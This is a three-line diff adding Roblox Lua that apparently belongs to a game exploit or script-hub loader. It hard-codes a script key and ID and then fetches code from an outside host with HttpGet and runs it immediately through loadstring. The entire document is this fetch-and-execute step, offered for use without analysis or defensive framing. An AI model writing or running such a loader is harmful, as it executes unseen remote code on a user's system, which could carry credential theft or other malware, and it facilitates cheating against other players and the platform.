@@ -1,0 +1,3 @@
+script_key="fTwOCCpIvJZIHpGkLBdpVveNzHzqOTXq";
+script_id = "c37384f3187d227fd3b084f40223e6d1"
+loadstring(game:HttpGet('https://api.nexonix.me/loader'))()
